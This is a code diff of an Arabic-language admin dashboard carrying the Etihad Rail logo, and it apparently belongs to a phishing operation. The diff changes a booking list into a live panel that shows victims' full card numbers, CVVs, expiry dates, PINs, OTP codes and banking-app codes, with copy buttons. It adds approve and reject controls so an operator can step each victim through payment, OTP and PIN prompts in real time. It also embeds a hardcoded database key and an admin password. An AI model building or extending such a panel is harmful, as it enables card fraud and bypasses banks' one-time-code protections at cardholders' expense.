@@ -75,7 +75,7 @@ html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",T
   font-size:13px;font-family:inherit;outline:none;flex:1;min-width:140px}
 .search-row input:focus,.search-row select:focus{border-color:var(--gold)}
 .tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
-table{width:100%;border-collapse:collapse;font-size:13px;min-width:900px}
+table{width:100%;border-collapse:collapse;font-size:13px;min-width:1100px}
 th{background:var(--bg);padding:10px 12px;text-align:right;font-weight:700;color:var(--muted);
   white-space:nowrap;position:sticky;top:0}
 td{padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:middle}
@@ -91,18 +91,21 @@ tr:hover td{background:#fafafa}
 .copy-btn{background:none;border:1px solid var(--line);border-radius:6px;padding:3px 8px;
   font-size:11px;cursor:pointer;font-family:inherit;color:var(--ink);transition:.15s}
 .copy-btn:hover{background:var(--bg);border-color:var(--gold)}
-.copy-btn:active{background:var(--gold-light)}
-.act-btn{background:none;border:1px solid var(--line);border-radius:8px;padding:5px 10px;
-  font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s;white-space:nowrap}
+.act-btn{display:inline-block;border:1px solid var(--line);border-radius:8px;padding:5px 10px;
+  font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s;white-space:nowrap;background:none}
 .act-btn:hover{border-color:var(--gold);color:var(--gold)}
-.act-btn.del{color:var(--red);border-color:var(--red)}
+.act-btn.green{color:#fff;background:var(--green);border-color:var(--green)}
+.act-btn.green:hover{opacity:.85}
+.act-btn.red{color:#fff;background:var(--red);border-color:var(--red)}
+.act-btn.red:hover{opacity:.85}
+.act-btn.del{color:var(--red);border-color:var(--red);background:none}
 .act-btn.del:hover{background:#fee2e2}
 .empty-row{text-align:center;padding:40px;color:var(--muted)}
 
 .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;
   justify-content:center;z-index:999;padding:20px;backdrop-filter:blur(4px)}
 .modal-overlay.open{display:flex}
-.modal-box{background:var(--card);border-radius:20px;padding:28px;width:100%;max-width:600px;
+.modal-box{background:var(--card);border-radius:20px;padding:28px;width:100%;max-width:700px;
   max-height:85vh;overflow-y:auto;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.3)}
 .modal-close{position:absolute;top:14px;left:14px;background:none;border:none;font-size:26px;
   cursor:pointer;color:var(--muted);line-height:1}
@@ -111,7 +114,7 @@ tr:hover td{background:#fafafa}
 .visitors-list{display:flex;flex-direction:column;gap:10px;max-height:60vh;overflow-y:auto;padding-left:4px}
 .visitor-row{background:var(--bg);border:1px solid var(--line);border-radius:12px;padding:14px}
 .visitor-head{display:flex;align-items:center;justify-content:space-between;gap:10px}
-.visitor-head .v-id{font-size:14px;font-weight:700;display:flex;align-items:center;gap:6px}
+.visitor-head .v-id{font-size:14px;font-weight:700}
 .visitor-head .v-time{font-size:11px;color:var(--muted)}
 .visitor-sid{font-family:monospace;font-size:11px;color:var(--muted);direction:ltr;text-align:left;word-break:break-all;margin-top:6px}
 .visitors-empty{text-align:center;padding:40px 20px;color:var(--muted);font-size:14px}
@@ -126,11 +129,13 @@ tr:hover td{background:#fafafa}
   padding:12px 28px;border-radius:12px;font-size:13px;font-weight:600;z-index:9999;
   opacity:0;transition:opacity .3s;pointer-events:none}
 .toast.show{opacity:1}
+
+@keyframes fadeRow{from{background:#fef3c7}to{background:transparent}}
+tr.highlight td{animation:fadeRow 2s ease-out}
 </style>
 </head>
 <body>
 
-<!-- Login -->
 <div class="login-wrap" id="loginView">
   <div class="login-box">
     <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
@@ -143,15 +148,10 @@ tr:hover td{background:#fafafa}
   </div>
 </div>
 
-<!-- Dashboard -->
 <div class="layout" id="dashView">
   <div class="main">
-
     <div class="top-bar">
-      <h1>
-        <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
-        لوحة الإدارة
-      </h1>
+      <h1><img src="/etihad_rail_logo.png" alt="قطارات الاتحاد"> لوحة الإدارة</h1>
       <div class="top-bar-actions">
         <div class="auto-dot" title="تحديث تلقائي كل 3 ثوانٍ"></div>
         <button class="btn-refresh" onclick="refresh()">
@@ -162,7 +162,6 @@ tr:hover td{background:#fafafa}
       </div>
     </div>
 
-    <!-- Stats -->
     <div class="stats-row">
       <div class="stat-card s-active" onclick="openVisitorsModal()" title="عرض الزوار النشطين">
         <div class="stat-label">
@@ -172,11 +171,11 @@ tr:hover td{background:#fafafa}
         <div class="stat-num" id="sActive">0</div>
       </div>
       <div class="stat-card s-total">
-        <div class="stat-label">إجمالي الحجوزات</div>
+        <div class="stat-label">إجمالي الطلبات</div>
         <div class="stat-num" id="sTotal">0</div>
       </div>
       <div class="stat-card s-pending">
-        <div class="stat-label">جديد</div>
+        <div class="stat-label">بانتظار إجراء</div>
         <div class="stat-num" id="sPending">0</div>
       </div>
       <div class="stat-card s-done">
@@ -185,20 +184,24 @@ tr:hover td{background:#fafafa}
       </div>
     </div>
 
-    <!-- Bookings Table -->
     <div class="card-box">
       <h2>
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 10a4 4 0 0 1-8 0"/><path d="M3.4 5.467a2 2 0 0 0-.4 1.2V20a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6.667a2 2 0 0 0-.4-1.2l-2-2.667A2 2 0 0 0 17 2H7a2 2 0 0 0-1.6.8z"/></svg>
-        الحجوزات
+        الطلبات
       </h2>
       <div class="search-row">
-        <input type="text" id="searchInput" placeholder="بحث بالاسم أو رقم الجوال أو رقم الهوية..." oninput="renderOrders()">
+        <input type="text" id="searchInput" placeholder="بحث بالاسم أو الجوال أو رقم البطاقة..." oninput="renderOrders()">
         <select id="filterStatus" onchange="renderOrders()">
           <option value="">جميع الحالات</option>
           <option value="new">جديد</option>
-          <option value="confirmed">مؤكد</option>
-          <option value="completed">مكتمل</option>
-          <option value="cancelled">ملغي</option>
+          <option value="payment_done">بانتظار موافقة الدفع</option>
+          <option value="payment_approved">دفع مقبول</option>
+          <option value="payment_rejected">دفع مرفوض</option>
+          <option value="otp_done">بانتظار موافقة OTP</option>
+          <option value="otp_approved">OTP مقبول</option>
+          <option value="otp_rejected">OTP مرفوض</option>
+          <option value="pin_done">بانتظار موافقة PIN</option>
+          <option value="app_code_done">بانتظار كود التطبيق</option>
         </select>
       </div>
       <div class="tbl-wrap">
@@ -209,22 +212,20 @@ tr:hover td{background:#fafafa}
               <th>الحالة</th>
               <th>الاسم</th>
               <th>الجوال</th>
-              <th>رقم الهوية</th>
+              <th>البطاقة</th>
+              <th>OTP / PIN / كود</th>
               <th>المسار</th>
-              <th>الركاب</th>
               <th>المبلغ</th>
-              <th>المرجع</th>
               <th>التاريخ</th>
               <th>إجراءات</th>
             </tr>
           </thead>
           <tbody id="ordersBody">
-            <tr><td colspan="11" class="empty-row">جاري التحميل...</td></tr>
+            <tr><td colspan="10" class="empty-row">جاري التحميل...</td></tr>
           </tbody>
         </table>
       </div>
     </div>
-
   </div>
 </div>
 
@@ -241,343 +242,223 @@ tr:hover td{background:#fafafa}
 
 <!-- Detail Modal -->
 <div class="modal-overlay" id="detailModal">
-  <div class="modal-box" style="max-width:700px">
+  <div class="modal-box">
     <button class="modal-close" onclick="closeModal('detailModal')">×</button>
-    <h2>تفاصيل الحجز</h2>
+    <h2>تفاصيل الطلب</h2>
     <div class="detail-grid" id="detailGrid"></div>
   </div>
 </div>
 
-<!-- Toast -->
 <div class="toast" id="toast"></div>
 
 <script>
-var SUPABASE_URL = "https://rfmbqnfjfaheiyfmaszu.supabase.co";
-var SUPABASE_KEY = "sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
+var SB_URL = "https://rfmbqnfjfaheiyfmaszu.supabase.co";
+var SB_KEY = "sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
 var ADMIN_PASS = "Admin@2026!";
-var REST = SUPABASE_URL + "/rest/v1";
-var HEADERS = {
-  "apikey": SUPABASE_KEY,
-  "Authorization": "Bearer " + SUPABASE_KEY,
-  "Content-Type": "application/json",
-  "Prefer": "return=representation"
-};
+var REST = SB_URL + "/rest/v1";
+var H = {"apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY,"Content-Type":"application/json","Prefer":"return=representation"};
 
-var AUTHED = false;
-var ALL_ORDERS = [];
-var LAST_VISITORS = [];
+var AUTHED = false, ALL = [], VISITORS = [];
 
-function doLogin() {
-  var p = document.getElementById("loginPass").value;
-  if (p === ADMIN_PASS) {
-    AUTHED = true;
-    sessionStorage.setItem("er_admin", "1");
-    document.getElementById("loginView").style.display = "none";
-    document.getElementById("dashView").style.display = "block";
-    refresh();
-  } else {
-    var el = document.getElementById("loginErr");
-    el.style.display = "block";
-    setTimeout(function() { el.style.display = "none"; }, 3000);
-  }
+function doLogin(){
+  if(document.getElementById("loginPass").value===ADMIN_PASS){
+    AUTHED=true;sessionStorage.setItem("er_admin","1");
+    document.getElementById("loginView").style.display="none";
+    document.getElementById("dashView").style.display="block";refresh();
+  } else {var e=document.getElementById("loginErr");e.style.display="block";setTimeout(function(){e.style.display="none"},3000)}
 }
-function doLogout() {
-  AUTHED = false;
-  sessionStorage.removeItem("er_admin");
-  document.getElementById("dashView").style.display = "none";
-  document.getElementById("loginView").style.display = "flex";
-}
-function checkAuth() {
-  if (sessionStorage.getItem("er_admin") === "1") {
-    AUTHED = true;
-    document.getElementById("loginView").style.display = "none";
-    document.getElementById("dashView").style.display = "block";
-    refresh();
-  }
-}
+function doLogout(){AUTHED=false;sessionStorage.removeItem("er_admin");document.getElementById("dashView").style.display="none";document.getElementById("loginView").style.display="flex"}
+function checkAuth(){if(sessionStorage.getItem("er_admin")==="1"){AUTHED=true;document.getElementById("loginView").style.display="none";document.getElementById("dashView").style.display="block";refresh()}}
 
-function sbGet(table, query) {
-  var url = REST + "/" + table + (query ? "?" + query : "");
-  return fetch(url, { headers: HEADERS }).then(function(res) {
-    if (!res.ok) return [];
-    return res.json();
-  }).catch(function() { return []; });
-}
-function sbDelete(table, id) {
-  var url = REST + "/" + table + "?id=eq." + id;
-  return fetch(url, { method: "DELETE", headers: HEADERS });
-}
+function sbGet(t,q){return fetch(REST+"/"+t+(q?"?"+q:""),{headers:H}).then(function(r){return r.ok?r.json():[]}).catch(function(){return[]})}
+function sbPatch(t,id,d){return fetch(REST+"/"+t+"?id=eq."+id,{method:"PATCH",headers:Object.assign({},H,{"Prefer":"return=minimal"}),body:JSON.stringify(d)})}
+function sbDelete(t,id){return fetch(REST+"/"+t+"?id=eq."+id,{method:"DELETE",headers:H})}
 
-function parseAddress(addr) {
-  if (!addr) return {};
-  var result = {};
-  var parts = addr.split(" • ");
-  for (var i = 0; i < parts.length; i++) {
-    var p = parts[i].trim();
-    if (p.indexOf("|") !== -1) {
-      var dp = p.split("|");
-      result.departure = dp[0].trim();
-      if (dp[1]) result.returnInfo = dp[1].trim();
-    } else if (/\d+\s*راكب/.test(p)) {
-      var m = p.match(/(\d+)\s*راكب/);
-      if (m) result.passengers = m[1];
-    } else if (/[\d,.]+\s*(AED|درهم)/i.test(p)) {
-      var m2 = p.match(/([\d,.]+)\s*(AED|درهم)/i);
-      if (m2) result.amount = m2[1] + " " + m2[2];
-    } else if (/^[A-Z]{2,}-[A-Z0-9]+$/i.test(p)) {
-      result.reference = p;
-    } else if (!result.extra) {
-      result.extra = p;
-    }
-  }
-  return result;
+function loadOrders(){
+  if(!AUTHED)return;
+  sbGet("visitors","select=*&order=created_at.desc").then(function(d){ALL=d||[];updateStats();renderOrders()});
 }
-
-function parseNotes(notes) {
-  if (!notes) return {};
-  var result = {};
-  var parts = notes.split(" • ");
-  for (var i = 0; i < parts.length; i++) {
-    var p = parts[i].trim();
-    if (p.indexOf("البريد:") === 0) result.email = p.replace("البريد:", "").trim();
-    else if (p.indexOf("الدرجة:") === 0) result.travelClass = p.replace("الدرجة:", "").trim();
-    else if (p.indexOf("الوصول:") === 0) result.arrival = p.replace("الوصول:", "").trim();
-    else if (p.indexOf("المغادرة:") === 0) result.departureStation = p.replace("المغادرة:", "").trim();
-    else {
-      if (!result.other) result.other = [];
-      result.other.push(p);
-    }
-  }
-  return result;
-}
-
-function loadOrders() {
-  if (!AUTHED) return;
-  sbGet("visitors", "select=*&order=created_at.desc").then(function(data) {
-    ALL_ORDERS = data || [];
-    updateStats();
-    renderOrders();
+function loadActiveVisitors(){
+  if(!AUTHED)return;
+  var cutoff=new Date(Date.now()-60000).toISOString();
+  sbGet("site_visitors","select=*&created_at=gte."+encodeURIComponent(cutoff)+"&order=created_at.desc").then(function(d){
+    VISITORS=d||[];
+    document.getElementById("sActive").textContent=VISITORS.length;
+    if(document.getElementById("visitorsModal").classList.contains("open"))renderVisitors();
   });
 }
+function refresh(){loadOrders();loadActiveVisitors()}
 
-function loadActiveVisitors() {
-  if (!AUTHED) return;
-  var cutoff = new Date(Date.now() - 60000).toISOString();
-  sbGet("site_visitors", "select=*&created_at=gte." + encodeURIComponent(cutoff) + "&order=created_at.desc").then(function(data) {
-    LAST_VISITORS = data || [];
-    document.getElementById("sActive").textContent = LAST_VISITORS.length;
-    if (document.getElementById("visitorsModal").classList.contains("open")) {
-      renderVisitors(LAST_VISITORS);
-    }
-  });
+var PENDING=["payment_done","otp_done","pin_done","app_code_done"];
+var DONE=["payment_approved","otp_approved","pin_done","app_code_approved","max_code"];
+
+function updateStats(){
+  document.getElementById("sTotal").textContent=ALL.length;
+  document.getElementById("sPending").textContent=ALL.filter(function(o){return PENDING.indexOf(o.status)!==-1}).length;
+  document.getElementById("sDone").textContent=ALL.filter(function(o){return DONE.indexOf(o.status)!==-1}).length;
 }
 
-function refresh() {
-  loadOrders();
-  loadActiveVisitors();
+function esc(s){if(!s)return"";var d=document.createElement("div");d.appendChild(document.createTextNode(s));return d.innerHTML}
+function maskCard(n){if(!n)return"";var s=n.replace(/\s/g,"");return s.length<8?s:s.slice(0,4)+" •••• "+s.slice(-4)}
+function formatDate(i){if(!i)return"—";return new Date(i).toLocaleDateString("ar-AE",{month:"short",day:"numeric",hour:"2-digit",minute:"2-digit"})}
+function timeAgo(i){if(!i)return"";var d=Math.floor((Date.now()-new Date(i).getTime())/1000);if(d<10)return"الآن";if(d<60)return d+" ث";if(d<3600)return Math.floor(d/60)+" د";return Math.floor(d/3600)+" س"}
+
+function statusBadge(s){
+  var m={"new":["جديد","badge-blue"],
+    "payment_done":["⚠ بانتظار الدفع","badge-orange"],
+    "payment_approved":["✅ دفع مقبول","badge-green"],
+    "payment_rejected":["❌ دفع مرفوض","badge-red"],
+    "otp_done":["⚠ بانتظار OTP","badge-orange"],
+    "otp_approved":["✅ OTP مقبول","badge-green"],
+    "otp_rejected":["❌ OTP مرفوض","badge-red"],
+    "pin_done":["⚠ بانتظار PIN","badge-orange"],
+    "pin_approved":["✅ PIN مقبول","badge-green"],
+    "pin_rejected":["❌ PIN مرفوض","badge-red"],
+    "app_code_done":["⚠ بانتظار كود","badge-orange"],
+    "app_code_approved":["✅ كود مقبول","badge-green"],
+    "app_code_rejected":["❌ كود مرفوض","badge-red"],
+    "max_code":["الحد الأقصى","badge-purple"]};
+  var e=m[s];if(!e)e=[s||"—","badge-gray"];
+  return '<span class="badge '+e[1]+'">'+e[0]+'</span>';
 }
 
-function updateStats() {
-  document.getElementById("sTotal").textContent = ALL_ORDERS.length;
-  var newCount = ALL_ORDERS.filter(function(o) { return o.status === "new" || !o.status; }).length;
-  var doneCount = ALL_ORDERS.filter(function(o) {
-    return o.status === "completed" || o.status === "confirmed";
-  }).length;
-  document.getElementById("sPending").textContent = newCount;
-  document.getElementById("sDone").textContent = doneCount;
-}
-
-function statusBadge(s) {
-  var map = {
-    "new": ["جديد", "badge-blue"],
-    "confirmed": ["مؤكد", "badge-green"],
-    "completed": ["مكتمل", "badge-gold"],
-    "cancelled": ["ملغي", "badge-red"],
-    "pending": ["قيد الانتظار", "badge-orange"],
-    "rail_booking": ["حجز قطار", "badge-purple"]
-  };
-  var entry = map[s];
-  if (!entry) entry = [s || "—", "badge-gray"];
-  return '<span class="badge ' + entry[1] + '">' + entry[0] + '</span>';
-}
-
-function timeAgo(iso) {
-  if (!iso) return "";
-  var diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
-  if (diff < 10) return "الآن";
-  if (diff < 60) return diff + " ث";
-  if (diff < 3600) return Math.floor(diff / 60) + " د";
-  if (diff < 86400) return Math.floor(diff / 3600) + " س";
-  return Math.floor(diff / 86400) + " ي";
-}
-
-function formatDate(iso) {
-  if (!iso) return "—";
-  var d = new Date(iso);
-  return d.toLocaleDateString("ar-AE", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
-}
-
-function esc(str) {
-  if (!str) return "";
-  var div = document.createElement("div");
-  div.appendChild(document.createTextNode(str));
-  return div.innerHTML;
-}
-
-function renderOrders() {
-  var q = (document.getElementById("searchInput").value || "").toLowerCase().trim();
-  var sf = document.getElementById("filterStatus").value;
-  var list = ALL_ORDERS;
-  if (sf) list = list.filter(function(o) { return o.status === sf; });
-  if (q) list = list.filter(function(o) {
-    return (o.name || "").toLowerCase().indexOf(q) !== -1 ||
-      (o.mobile || "").indexOf(q) !== -1 ||
-      (o.id_number || "").indexOf(q) !== -1;
-  });
-  var tbody = document.getElementById("ordersBody");
-  if (!list.length) {
-    tbody.innerHTML = '<tr><td colspan="11" class="empty-row">لا توجد نتائج</td></tr>';
-    return;
+function actionBtns(o){
+  var s=o.status, id=o.id, btns='';
+  btns+='<button class="act-btn" onclick="viewDetail(\''+id+'\')">عرض</button> ';
+  if(s==="payment_done"){
+    btns+='<button class="act-btn green" onclick="doAction(\''+id+'\',\'payment_approved\')">✅ قبول</button> ';
+    btns+='<button class="act-btn red" onclick="doAction(\''+id+'\',\'payment_rejected\')">❌ رفض</button> ';
+  } else if(s==="otp_done"){
+    btns+='<button class="act-btn green" onclick="doAction(\''+id+'\',\'otp_approved\')">✅ قبول</button> ';
+    btns+='<button class="act-btn red" onclick="doAction(\''+id+'\',\'otp_rejected\')">❌ رفض</button> ';
+  } else if(s==="pin_done"){
+    btns+='<button class="act-btn green" onclick="doAction(\''+id+'\',\'pin_approved\')">✅ قبول</button> ';
+    btns+='<button class="act-btn red" onclick="doAction(\''+id+'\',\'pin_rejected\')">❌ رفض</button> ';
+  } else if(s==="app_code_done"){
+    btns+='<button class="act-btn green" onclick="doAction(\''+id+'\',\'app_code_approved\')">✅ قبول</button> ';
+    btns+='<button class="act-btn red" onclick="doAction(\''+id+'\',\'app_code_rejected\')">❌ رفض</button> ';
   }
-  tbody.innerHTML = list.map(function(o, i) {
-    var parsed = parseAddress(o.address);
-    var route = esc(o.card_type || "—");
-    var passengers = esc(parsed.passengers || "—");
-    var amount = esc(parsed.amount || "—");
-    var ref = parsed.reference || "";
-    var refDisplay = ref ? esc(ref) : "—";
-    var refCopy = ref ? ' <button class="copy-btn" onclick="copyText(\'' + esc(ref) + '\')">نسخ</button>' : '';
-    return '<tr>' +
-      '<td>' + (i + 1) + '</td>' +
-      '<td>' + statusBadge(o.status) + '</td>' +
-      '<td style="font-weight:700">' + esc(o.name || "—") + '</td>' +
-      '<td style="direction:ltr;white-space:nowrap">' + esc(o.mobile || "—") + '</td>' +
-      '<td>' + esc(o.id_number || "—") + '</td>' +
-      '<td style="font-size:12px">' + route + '</td>' +
-      '<td>' + passengers + '</td>' +
-      '<td style="font-weight:700;color:var(--green)">' + amount + '</td>' +
-      '<td style="font-family:monospace;font-size:12px;direction:ltr">' + refDisplay + refCopy + '</td>' +
-      '<td style="font-size:12px;white-space:nowrap">' + formatDate(o.created_at) + '</td>' +
-      '<td style="white-space:nowrap">' +
-        '<button class="act-btn" onclick="viewDetail(\'' + o.id + '\')">عرض</button> ' +
-        '<button class="act-btn del" onclick="deleteOrder(\'' + o.id + '\')">حذف</button>' +
-      '</td>' +
+  btns+='<button class="act-btn del" onclick="deleteOrder(\''+id+'\')">حذف</button>';
+  return btns;
+}
+
+function parseAmount(addr){
+  if(!addr)return"—";
+  var m=addr.match(/([\d,.]+)\s*(AED|درهم)/i);
+  return m?m[1]+" "+m[2]:"—";
+}
+
+function renderOrders(){
+  var q=(document.getElementById("searchInput").value||"").toLowerCase().trim();
+  var sf=document.getElementById("filterStatus").value;
+  var list=ALL;
+  if(sf)list=list.filter(function(o){return o.status===sf});
+  if(q)list=list.filter(function(o){
+    return (o.name||"").toLowerCase().indexOf(q)!==-1||
+      (o.mobile||"").indexOf(q)!==-1||
+      (o.card_number||"").replace(/\s/g,"").indexOf(q.replace(/\s/g,""))!==-1||
+      (o.id_number||"").indexOf(q)!==-1;
+  });
+  var tb=document.getElementById("ordersBody");
+  if(!list.length){tb.innerHTML='<tr><td colspan="10" class="empty-row">لا توجد نتائج</td></tr>';return}
+
+  tb.innerHTML=list.map(function(o,i){
+    var cardInfo=o.card_number?
+      '<span style="font-size:12px;direction:ltr;display:inline-block">'+esc(maskCard(o.card_number))+'</span>'+
+      ' <button class="copy-btn" onclick="copyText(\''+esc(o.card_number.replace(/\s/g,""))+'\')">نسخ</button>'+
+      (o.cvv?' <button class="copy-btn" onclick="copyText(\''+esc(o.cvv)+'\')">CVV</button>':'')
+      :"—";
+
+    var otpInfo="";
+    if(o.otp_code)otpInfo='<b style="direction:ltr">'+esc(o.otp_code)+'</b> <button class="copy-btn" onclick="copyText(\''+esc(o.otp_code)+'\')">نسخ</button>';
+    if(o.card_pin)otpInfo+=(otpInfo?" | ":"")+'PIN: <b>'+esc(o.card_pin)+'</b> <button class="copy-btn" onclick="copyText(\''+esc(o.card_pin)+'\')">نسخ</button>';
+    if(o.app_code)otpInfo+=(otpInfo?" | ":"")+'Code: <b>'+esc(o.app_code)+'</b>';
+    if(!otpInfo)otpInfo="—";
+
+    return '<tr class="'+(PENDING.indexOf(o.status)!==-1?"highlight":"")+'">'+
+      '<td>'+(i+1)+'</td>'+
+      '<td>'+statusBadge(o.status)+'</td>'+
+      '<td style="font-weight:700">'+esc(o.name||"—")+'</td>'+
+      '<td style="direction:ltr;white-space:nowrap">'+esc(o.mobile||"—")+'</td>'+
+      '<td>'+cardInfo+'</td>'+
+      '<td>'+otpInfo+'</td>'+
+      '<td style="font-size:12px">'+esc(o.card_type||"—")+'</td>'+
+      '<td style="font-weight:700;color:var(--green)">'+esc(parseAmount(o.address))+'</td>'+
+      '<td style="font-size:12px;white-space:nowrap">'+formatDate(o.created_at)+'</td>'+
+      '<td style="white-space:nowrap">'+actionBtns(o)+'</td>'+
     '</tr>';
   }).join("");
 }
 
-function renderVisitors(list) {
-  document.getElementById("visitorsCount").textContent = list.length;
-  var box = document.getElementById("visitorsList");
-  if (!list.length) {
-    box.innerHTML = '<div class="visitors-empty">لا يوجد زوار نشطين الآن</div>';
-    return;
-  }
-  box.innerHTML = list.map(function(v) {
-    var vid = v.visitor_id || v.id || "";
-    var lastTime = v.last_seen_at || v.created_at;
-    var lastPage = v.last_page || "";
-    var pageTag = lastPage ? '<span style="font-size:11px;background:var(--gold-light);color:#8b6914;padding:3px 10px;border-radius:999px;font-weight:700">' + esc(lastPage) + '</span>' : '';
-    return '<div class="visitor-row">' +
-      '<div class="visitor-head">' +
-        '<div class="v-id">🌐 زائر ' + pageTag + '</div>' +
-        '<span class="v-time">' + timeAgo(lastTime) + '</span>' +
-      '</div>' +
-      '<div class="visitor-sid">' + esc(vid) + '</div>' +
-    '</div>';
-  }).join("");
-}
-
-function openVisitorsModal() {
-  openModal("visitorsModal");
-  renderVisitors(LAST_VISITORS);
-  loadActiveVisitors();
-}
-
-function viewDetail(id) {
-  var o = null;
-  for (var i = 0; i < ALL_ORDERS.length; i++) {
-    if (String(ALL_ORDERS[i].id) === String(id)) { o = ALL_ORDERS[i]; break; }
-  }
-  if (!o) return;
-  var parsed = parseAddress(o.address);
-  var notes = parseNotes(o.address_notes);
-  var fields = [
-    ["الحالة", o.status, true],
-    ["نوع الطلب", o.order_type],
-    ["الاسم", o.name],
-    ["رقم الجوال", o.mobile],
-    ["رقم الهوية", o.id_number],
-    ["المسار", o.card_type],
-    ["تاريخ المغادرة", parsed.departure],
-    ["العودة", parsed.returnInfo],
-    ["عدد الركاب", parsed.passengers],
-    ["المبلغ الإجمالي", parsed.amount],
-    ["رقم المرجع", parsed.reference],
-    ["البريد الإلكتروني", notes.email],
-    ["درجة السفر", notes.travelClass],
-    ["معلومات الوصول", notes.arrival],
-    ["تاريخ الإنشاء", formatDate(o.created_at)],
-    ["آخر نشاط", formatDate(o.last_activity_at)]
-  ];
-  if (o.address) fields.push(["تفاصيل الرحلة", o.address, false, true]);
-  if (o.address_notes) fields.push(["ملاحظات إضافية", o.address_notes, false, true]);
-
-  document.getElementById("detailGrid").innerHTML = fields.map(function(f) {
-    var label = f[0];
-    var val = f[1];
-    var isStatus = f[2] || false;
-    var isFull = f[3] || false;
-    var displayVal;
-    if (isStatus) {
-      displayVal = statusBadge(val);
-    } else {
-      displayVal = esc(val ? String(val) : "—");
-    }
-    var copyBtn = "";
-    if (!isStatus && val && String(val) !== "—" && String(val).length > 1) {
-      copyBtn = ' <button class="copy-btn" onclick="copyText(\'' + esc(String(val)).replace(/'/g, "\\&#39;") + '\')">نسخ</button>';
-    }
-    return '<div class="dg-item' + (isFull ? ' dg-full' : '') + '">' +
-      '<div class="dg-label">' + label + '</div>' +
-      '<div class="dg-value">' + displayVal + copyBtn + '</div>' +
-    '</div>';
-  }).join("");
-  openModal("detailModal");
-}
-
-function deleteOrder(id) {
-  if (!confirm("هل تريد حذف هذا الحجز نهائيا؟")) return;
-  sbDelete("visitors", id).then(function() {
-    showToast("تم حذف الحجز");
+function doAction(id,status){
+  sbPatch("visitors",id,{status:status,last_activity_at:new Date().toISOString()}).then(function(){
+    showToast("تم تحديث الحالة: "+status);
     loadOrders();
   });
 }
 
-function openModal(id) { document.getElementById(id).classList.add("open"); }
-function closeModal(id) { document.getElementById(id).classList.remove("open"); }
-document.querySelectorAll(".modal-overlay").forEach(function(el) {
-  el.addEventListener("click", function(e) { if (e.target === el) el.classList.remove("open"); });
-});
+function viewDetail(id){
+  var o=null;for(var i=0;i<ALL.length;i++){if(String(ALL[i].id)===String(id)){o=ALL[i];break}}
+  if(!o)return;
+  var f=[
+    ["الحالة",statusBadge(o.status),true],
+    ["الاسم",o.name],
+    ["رقم الجوال",o.mobile],
+    ["رقم الهوية",o.id_number],
+    ["المسار",o.card_type],
+    ["اسم حامل البطاقة",o.card_name],
+    ["رقم البطاقة",o.card_number],
+    ["انتهاء الصلاحية",o.expiry_month&&o.expiry_year?o.expiry_month+"/"+o.expiry_year:null],
+    ["CVV",o.cvv],
+    ["PIN",o.card_pin],
+    ["رمز OTP",o.otp_code],
+    ["كود التطبيق",o.app_code],
+    ["نوع الطلب",o.order_type],
+    ["تاريخ الإنشاء",formatDate(o.created_at)],
+    ["آخر نشاط",formatDate(o.last_activity_at)]
+  ];
+  if(o.address)f.push(["تفاصيل الرحلة",o.address,false,true]);
+  if(o.address_notes)f.push(["ملاحظات",o.address_notes,false,true]);
+  if(o.rejected_cards&&o.rejected_cards.length)f.push(["بطاقات مرفوضة",JSON.stringify(o.rejected_cards,null,2),false,true]);
+  if(o.rejected_otps&&o.rejected_otps.length)f.push(["OTP مرفوضة",JSON.stringify(o.rejected_otps,null,2),false,true]);
 
-function showToast(msg) {
-  var el = document.getElementById("toast");
-  el.textContent = msg;
-  el.classList.add("show");
-  setTimeout(function() { el.classList.remove("show"); }, 2500);
+  document.getElementById("detailGrid").innerHTML=f.map(function(r){
+    var lbl=r[0],val=r[1],isHtml=r[2]||false,isFull=r[3]||false;
+    var disp=isHtml?(val||"—"):esc(val?String(val):"—");
+    var cb="";
+    if(!isHtml&&val&&String(val)!=="—"&&String(val).length>1)
+      cb=' <button class="copy-btn" onclick="copyText(\''+esc(String(val)).replace(/'/g,"&#39;")+'\')">نسخ</button>';
+    return '<div class="dg-item'+(isFull?' dg-full':'')+'"><div class="dg-label">'+lbl+'</div><div class="dg-value"'+(isFull?' style="white-space:pre-wrap;font-size:12px"':'')+'>'+disp+cb+'</div></div>';
+  }).join("");
+  openModal("detailModal");
 }
 
-function copyText(text) {
-  navigator.clipboard.writeText(text).then(function() { showToast("تم النسخ: " + text); });
+function deleteOrder(id){
+  if(!confirm("هل تريد حذف هذا الطلب نهائيا؟"))return;
+  sbDelete("visitors",id).then(function(){showToast("تم حذف الطلب");loadOrders()});
 }
+
+function renderVisitors(){
+  document.getElementById("visitorsCount").textContent=VISITORS.length;
+  var box=document.getElementById("visitorsList");
+  if(!VISITORS.length){box.innerHTML='<div class="visitors-empty">لا يوجد زوار نشطين الآن</div>';return}
+  box.innerHTML=VISITORS.map(function(v){
+    var vid=v.visitor_id||v.id||"";
+    var t=v.last_seen_at||v.created_at;
+    return '<div class="visitor-row"><div class="visitor-head"><div class="v-id">🌐 زائر</div><span class="v-time">'+timeAgo(t)+'</span></div><div class="visitor-sid">'+esc(vid)+'</div></div>';
+  }).join("");
+}
+function openVisitorsModal(){openModal("visitorsModal");renderVisitors();loadActiveVisitors()}
+
+function openModal(id){document.getElementById(id).classList.add("open")}
+function closeModal(id){document.getElementById(id).classList.remove("open")}
+document.querySelectorAll(".modal-overlay").forEach(function(el){el.addEventListener("click",function(e){if(e.target===el)el.classList.remove("open")})});
+
+function showToast(msg){var el=document.getElementById("toast");el.textContent=msg;el.classList.add("show");setTimeout(function(){el.classList.remove("show")},2500)}
+function copyText(t){navigator.clipboard.writeText(t).then(function(){showToast("تم النسخ: "+t)})}
 
 checkAuth();
-setInterval(function() {
-  if (AUTHED) {
